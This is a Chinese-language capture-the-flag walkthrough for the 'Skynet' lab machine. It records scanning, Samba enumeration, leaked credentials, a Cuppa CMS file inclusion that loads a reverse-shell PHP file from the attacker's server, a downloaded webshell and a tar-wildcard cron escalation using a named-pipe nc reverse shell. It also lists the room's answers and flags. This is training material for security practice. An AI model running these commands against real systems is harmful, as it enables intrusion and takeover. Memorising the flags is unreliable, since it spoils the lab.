# 服务扫描
```
┌──(root💀kali)-[~]
└─# nmap -sV 10.10.166.193                                                                                                                                                                                   255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 05:18 EDT
Nmap scan report for 10.10.111.23
Host is up (0.32s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
```


#目录爆破
```
└─# python3 dirsearch.py -u http://10.10.166.193 -e * -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | HTTP method: get | Threads: 50 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-08-31_05-34-51.log

Target: http://10.10.166.193

[05:34:52] Starting: 
[05:34:58] 301 -  312B  - /admin  ->  http://10.10.111.23/admin/
[05:34:59] 200 -  523B  - /                 
[05:35:00] 301 -  310B  - /css  ->  http://10.10.111.23/css/
[05:35:03] 301 -  309B  - /js  ->  http://10.10.111.23/js/
[05:35:06] 301 -  313B  - /config  ->  http://10.10.111.23/config/
[05:35:19] 301 -  309B  - /ai  ->  http://10.10.111.23/ai/
[05:37:06] 301 -  319B  - /squirrelmail  ->  http://10.10.111.23/squirrelmail/
```




###枚举samba服务

#枚举用户，可以用空会话登录
```
┌──(root💀kali)-[~]
└─# enum4linux -U 10.10.166.193                                                                                                                                                                                                        255 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:38:03 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.166.193
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.166.193    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ===================================== 
|    Session Check on 10.10.166.193    |
 ===================================== 
[+] Server 10.10.166.193 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.166.193    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ============================= 
|    Users on 10.10.166.193    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 

user:[milesdyson] rid:[0x3e8]
enum4linux complete on Wed Sep  1 02:38:20 2021
```


#枚举分享目录
```
┌──(root💀kali)-[~]
└─# enum4linux -S 10.10.166.193
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:41:21 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.166.193
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.166.193    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ===================================== 
|    Session Check on 10.10.166.193    |
 ===================================== 
[+] Server 10.10.166.193 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.166.193    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ========================================= 
|    Share Enumeration on 10.10.166.193    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.166.193
//10.10.166.193/print$   Mapping: DENIED, Listing: N/A
//10.10.166.193/anonymous        Mapping: OK, Listing: OK
//10.10.166.193/milesdyson       Mapping: DENIED, Listing: N/A
//10.10.166.193/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Wed Sep  1 02:41:44 2021
```

#连接smb
smbclient  //10.10.166.193/anonymous

在logs/log1.txt里找到密码：cyborg007haloterminator

```
question:What is Miles password for his emails?

answer:cyborg007haloterminator
```

#登录 http://10.10.166.193/squirrelmail/

账号密码：milesdyson：cyborg007haloterminator


#邮件信息1，泄露samba密码

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

#邮件信息2，是一个奇怪的二进制，转成文本
```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```
转成文本：
```
balls hav zero tome to meto me tome to meto me tome to meto
```

#邮件信息3，一段奇怪的文字,放到谷歌里搜索了一下，好像是前些年那个出bug的facebook的AI说的一段话，有人说这是AI暴走，我认为这种说法是胡扯

```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to

```


#登录mailesdyson的samba
smbclient  //10.10.166.193/milesdyson -U milesdyson 
密码：)s{A&2Z=F^n_E.B`

#在notes/important.txt里得到信息

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

#隐藏目录名
/45kra24zxs28v3yd

```
question：What is the hidden directory?
answer：/45kra24zxs28v3yd

```


```
question：What is the vulnerability called when you can include a remote file for malicious purposes?
answer：/remote file inclusion 
```


#爆破隐藏目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u "http://10.10.166.193/45kra24zxs28v3yd/" -e* -t 50   

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 50 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-09-01_04-50-59.log

Target: http://10.10.166.193/45kra24zxs28v3yd/

[04:50:59] Starting: 
[04:51:14] 301 -  337B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.166.193/45kra24zxs28v3yd/administrator/
[04:51:14] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess
[04:51:15] 200 -    5KB - /45kra24zxs28v3yd/administrator/
[04:51:15] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
[04:51:26] 200 -  418B  - /45kra24zxs28v3yd/index.html                                                            
                                                                                                                  
Task Completed
```

得到登录页面：http://10.10.166.193/45kra24zxs28v3yd/index.php


#cms名称
Cuppa CMS

#cms exp
存在Local/Remote File Inclusion
https://www.exploit-db.com/exploits/25971

验证LFI：
http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

可以读取本机信息：
```
Field configuration:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false 
```


#远程读取php文件
准备好反弹shell文件，本地开启一个http服务
python3 -m http.server

http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.21.169:8000/revse_shell.php

#拿到初始shell
在/home/milesdyson找到user.txt

```
question：What is the user flag?
answer：7ce5c2109a40f958099283600a9ae807
```



#转成稳定shell，用命令行下载一句话木马
wget http://10.13.21.169:8000/shell.php1


#一句话木马访问地址，用菜刀连接
http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/shell.php

#可以su milesdyson（需要先转成tty）,密码是：cyborg007haloterminator，但是不可以用ssh直连

#查看定时任务
```
$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```


#查看定时任务脚本
```
$ cat /home/milesdyson/backups/backup.sh
cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```


#通配符提权，在/var/www/html/分别写入三个文件
因为靶机的nc不能使用-e，我们用另外一种方法做反弹shell

mknod /tmp/backpipe p

echo '/bin/sh 0</tmp/backpipe | nc 10.13.21.169 4455 1>/tmp/backpipe' > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1


#通配符提权解释
最后tar cf /home/milesdyson/backups/backup.tgz *这条命令的执行会变成：tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh 

#另外开启一个监听端口
nc -lnvp 4455

#在/root/找到root.txt

```
question：What is the root flag?
answer：3f0372db24753accc7179a282cd6a949

```
